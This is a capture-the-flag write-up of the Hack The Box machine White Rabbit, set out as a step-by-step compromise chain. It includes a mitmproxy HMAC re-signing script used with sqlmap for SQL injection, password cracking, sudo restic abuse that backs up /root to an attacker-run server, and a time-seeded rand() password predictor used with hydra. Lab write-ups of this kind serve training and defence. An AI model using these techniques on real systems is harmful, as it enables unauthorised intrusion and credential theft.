# White Rabbit

<p align="center">
  <img width="256" height="297" src="Images/WhiteRabbit.png" alt="White Rabbit">
</p>

## Machine information

| Field | Value |
| --- | --- |
| Name | White Rabbit |
| Platform | Hack The Box |
| Operating system | Linux |
| Difficulty | Insane |
| IP address | `10.10.11.63` |

## Overview

White Rabbit requires chaining several weaknesses and information leaks. A
status virtual host exposes details about internal services. An exported n8n
workflow then reveals both the secret used to sign GoPhish webhooks and an
unsafe SQL query. Recalculating the HMAC signature for every modified request
makes it possible to exploit the SQL injection and recover a command log.

That history contains the address and password of a Restic repository. One of
its snapshots stores a 7z archive containing SSH material for the user `bob`.
From the container reached as this user, a `sudo` permission for Restic allows
`/root` to be backed up to a controlled repository, exposing the SSH key for
`morpheus`. Finally, a predictable password generator makes it possible to
reconstruct `neo`'s password and obtain root access.

```text
Virtual hosts -> n8n workflow -> HMAC secret -> SQL injection
              -> command history -> Restic repository
              -> bob's SSH key -> sudo/restic abuse
              -> morpheus's SSH key -> predictable PRNG
              -> neo's credentials -> root
```

## 1. Reconnaissance

The main domain is first added to `/etc/hosts`:

```text
10.10.11.63 whiterabbit.htb
```

A full TCP scan reveals two SSH services and a Caddy web server:

```bash
sudo nmap -sS -sC -sV -p- -T5 --max-rate 10000 whiterabbit.htb
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9
80/tcp   open  http    Caddy httpd
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
```

Port `80` serves a page titled **White Rabbit - Pentesting Services**. The
main site offers little functionality, so the next logical step is virtual
host enumeration.

## 2. Virtual host enumeration

`ffuf` can replace the value of the `Host` header while sending every
request to the same IP address:

```bash
ffuf \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://whiterabbit.htb \
  -H 'Host: FUZZ.whiterabbit.htb' \
  -mc 200,302 -fs 0
```

The scan reveals `status.whiterabbit.htb`, which is added to the local hosts
file:

```text
10.10.11.63 whiterabbit.htb status.whiterabbit.htb
```

A request to this virtual host returns a redirect to `/dashboard`:

```bash
curl -I http://status.whiterabbit.htb
```

```http
HTTP/1.1 302 Found
Location: /dashboard
Server: Caddy
```

Content discovery identifies several relevant resources:

```bash
ffuf \
  -u http://status.whiterabbit.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.html,.js,.json,.txt \
  -fs 2444 -ic
```

```text
screenshots     [Status: 301]
assets          [Status: 301]
upload          [Status: 301]
robots.txt      [Status: 200]
metrics         [Status: 401]
manifest.json   [Status: 200]
```

The site's `404` behavior also makes `/status` worth treating as an
enumerable path. Repeating the scan below it reveals the public
`/status/temp` endpoint:

```bash
ffuf \
  -u http://status.whiterabbit.htb/status/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.html,.js,.json,.txt,.csv,.bak,.old,.zip,.tar,.gz,.env,.log,.conf \
  -fs 2444 -ic -t 100
```

```text
temp    [Status: 200, Size: 3359]
```

Information exposed by the status panel and its documentation discloses
additional virtual hosts. The resulting entry used during the machine is:

```text
10.10.11.63 whiterabbit.htb status.whiterabbit.htb \
  ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb \
  28efa8f7df.whiterabbit.htb
```

One of these services hosts Wiki.js documentation. It leads to a webhook on
`28efa8f7df.whiterabbit.htb` and confirms that GoPhish requests carry a
signature header similar to this one:

```http
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
```

## 3. Analyzing the n8n workflow

The `gophish_to_phishing_score_database.json` resource contains an exported
n8n workflow. Its signature node exposes the HMAC secret in clear text:

```json
{
  "action": "hmac",
  "type": "SHA256",
  "value": "={{ JSON.stringify($json.body) }}",
  "dataPropertyName": "calculated_signature",
  "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
}
```

The signature protects the request body's integrity: changing the JSON creates
a different HMAC and causes the server to reject the request. Knowing the
secret, however, allows a valid signature to be generated for any controlled
body.

Another node in the workflow builds a SQL query through direct interpolation:

```sql
SELECT * FROM victims
WHERE email = "{{ $json.body.email }}"
LIMIT 1
```

The `email` field is not parameterized and is therefore vulnerable to SQL
injection. To let `sqlmap` modify the payload without invalidating the
signature, a small `mitmproxy` addon can recalculate the HMAC of every
request.

## 4. Dynamically signing requests

The following code is saved as `proxy.py`:

```python
from mitmproxy import http
import hashlib
import hmac


SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"


def request(flow: http.HTTPFlow):
    if flow.request.path.startswith("/webhook/") and flow.request.method == "POST":
        body = flow.request.get_content()
        signature = hmac.new(SECRET, body, hashlib.sha256).hexdigest()
        flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
```

The local proxy is started on port `1717`:

```bash
mitmproxy --listen-port 1717 -s proxy.py
```

`sqlmap` can now send its requests through the proxy:

```bash
python3 sqlmap.py \
  -u 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d' \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers='Content-Type: application/json' \
  --proxy='http://127.0.0.1:1717' \
  --technique=BE --time-sec=3 --dbs
```

The tool identifies a MariaDB/MySQL backend and returns three databases:

```text
[*] information_schema
[*] phishing
[*] temp
```

## 5. Extracting the command history

The `temp` database contains a particularly interesting table:

```bash
python3 sqlmap.py \
  -u 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d' \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers='Content-Type: application/json' \
  --proxy='http://127.0.0.1:1717' \
  -D temp -T command_log --dump
```

```text
+----+---------------------+--------------------------------------------------------------+
| id | date                | command                                                      |
+----+---------------------+--------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/... | passwd   |
+----+---------------------+--------------------------------------------------------------+
```

This output provides three important pieces of information:

1. A new virtual host: `75951e6ff.whiterabbit.htb`.
2. The Restic repository password:
   `ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw`.
3. The exact time at which `neo`'s password generator was executed.

The last virtual host is added to `/etc/hosts`, and the repository password is
stored locally:

```bash
echo 'ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw' > .restic_passwd
chmod 600 .restic_passwd
```

## 6. Recovering the Restic snapshot

Restic stores encrypted, deduplicated backups as snapshots. The leaked
subdomain exposes one such repository over REST:

```bash
restic \
  -r rest:http://75951e6ff.whiterabbit.htb \
  --password-file .restic_passwd \
  snapshots
```

```text
ID        Time                 Host         Paths
---------------------------------------------------------
272cacd5  2025-03-07 02:18:40  whiterabbit  /dev/shm/bob/ssh
```

The snapshot is restored into a working directory:

```bash
mkdir restored
restic \
  -r rest:http://75951e6ff.whiterabbit.htb \
  --password-file .restic_passwd \
  restore 272cacd5 --target restored
```

The useful artifact is `bob.7z`. The Restic password does not unlock the
archive, so its hash is extracted and tested against a wordlist:

```bash
7z2john restored/dev/shm/bob/ssh/bob.7z > bob.hash
john --wordlist=/usr/share/wordlists/rockyou.txt bob.hash
```

```text
1q2w3e4r5t6y     (bob.7z)
```

The recovered password extracts three files:

```bash
7z x restored/dev/shm/bob/ssh/bob.7z
```

```text
bob
bob.pub
config
```

The `config` file identifies the SSH user and port:

```sshconfig
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

`bob` is an OpenSSH private key. After restricting its permissions, it can be
used against the service on port `2222`:

```bash
chmod 600 bob
ssh -i bob -p 2222 bob@whiterabbit.htb
```

The prompt's hostname, `ebdce80611e9`, indicates that this session is inside
a container rather than on the main host.

## 7. Abusing Restic through sudo

Privilege enumeration shows that `bob` may run Restic as root without a
password:

```bash
sudo -l
```

```text
User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

Restic can select an arbitrary source path and send its backup to a remote
repository. This permission therefore provides a way to read root-owned files
by preparing a Restic server under our control.

On the attacking machine, `rest-server` is started as follows:

```bash
mkdir root-repo
rest-server --path ./root-repo --no-auth --listen :1717
```

From the container, the remote repository is initialized and a snapshot of
`/root` is created. In the following commands, `10.10.16.43` represents the
attacker's VPN address and must be replaced with the correct value:

```bash
echo 'ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw' > /tmp/.restic_passwd

sudo /usr/bin/restic \
  -r rest:http://10.10.16.43:1717/root-repo \
  init --password-file /tmp/.restic_passwd

sudo /usr/bin/restic \
  -r rest:http://10.10.16.43:1717/root-repo \
  backup /root --password-file /tmp/.restic_passwd
```

Back on the attacking machine, the received snapshot can be restored:

```bash
restic -r ./root-repo --password-file .restic_passwd snapshots
restic -r ./root-repo --password-file .restic_passwd \
  restore latest --target restored-root
```

The restored `root` directory contains `morpheus` and `morpheus.pub`. The
first file is another SSH private key, this time valid for the main SSH
service:

```bash
chmod 600 restored-root/root/morpheus
ssh -i restored-root/root/morpheus morpheus@whiterabbit.htb
```

This session lands on the host rather than in the container. The `user.txt`
file in `morpheus`'s home directory completes the user stage.

## 8. Privilege escalation

The command log recovered through SQL injection showed that root ran the
following command at `2024-08-30 14:40:42 UTC`:

```bash
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
```

Only root can change another user's password without supplying the old one.
This confirms the privileged execution context and suggests that the program's
output became `neo`'s password.

After copying `neo-password-generator` to the analysis machine and examining
its behavior, it becomes clear that it seeds libc's pseudo-random number
generator with a value derived from the execution time and generates 20
characters with `rand()`. The command log provides the timestamp, leaving
only the millisecond component to enumerate.

The following script reproduces the algorithm and generates 1,000 candidates:

```python
#!/usr/bin/env python3

from ctypes import CDLL
import datetime


ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
libc = CDLL("libc.so.6")

executed_at = datetime.datetime(
    2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone.utc
)
seconds = executed_at.timestamp()

for milliseconds in range(1000):
    seed = int(seconds * 1000 + milliseconds)
    libc.srand(seed)

    password = ""
    for _ in range(20):
        password += ALPHABET[libc.rand() % len(ALPHABET)]

    print(password)
```

The candidate list is then tested against SSH on port `22`:

```bash
python3 generator.py > passwords.txt
hydra -l neo -P passwords.txt ssh://whiterabbit.htb -t 4
```

Hydra finds a valid password for `neo`. Its full value is intentionally
redacted here:

```text
[22][ssh] host: whiterabbit.htb login: neo password: WBSxhWgfnMiclr*****
```

After logging in as `neo`, this user has sufficient privileges to read the
final flag:

```bash
ssh neo@whiterabbit.htb
sudo cat /root/root.txt
```

## Flags

The flags are not published in full, avoiding a direct copy of the final
answers:

```text
user.txt: <redacted>
root.txt: e93d2b99d9f51ae8eb68af******
```

## Conclusion

White Rabbit does not depend on a single critical vulnerability. Its
compromise comes from chaining multiple design flaws and exposed secrets:

- The status panel leaks the names of internal services.
- The exported workflow reveals both an HMAC secret and a non-parameterized
  SQL query.
- The command log retains sensitive credentials and timestamps.
- A backup contains an SSH key inside an archive protected by a weak password.
- Permission to run Restic with `sudo` enables privileged files to be copied
  to a controlled remote repository.
- The password generator uses a non-cryptographic PRNG with a predictable seed.

Secrets should never be stored in exported workflows, command histories, or
accessible backups. Commands allowed through `sudo` must also be scoped
carefully: a legitimate backup utility can become a privileged file-reading
primitive. Finally, passwords must be generated from cryptographically secure
randomness rather than `srand()` and `rand()` seeded with the current time.
